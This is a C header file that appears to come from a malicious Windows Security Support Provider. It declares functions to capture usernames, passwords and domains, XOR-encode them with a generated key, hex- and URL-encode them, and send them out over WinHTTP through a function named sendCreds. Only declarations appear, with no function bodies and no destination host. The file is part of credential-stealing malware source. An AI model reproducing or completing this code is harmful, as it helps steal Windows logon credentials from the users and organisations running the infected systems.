#pragma once
#include <windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <ntsecapi.h>
#include "ssp.h"

#pragma comment(lib, "winhttp.lib")

wchar_t* urlEncode(const wchar_t*);
BOOL sendCreds(LPWSTR username, LPWSTR password, LPWSTR domain);
void xorWithKey(BYTE*, size_t, BYTE*, size_t);
char* wcharToChar(const wchar_t*);
char* charToHex(char*, size_t);
char* generateKey(size_t);
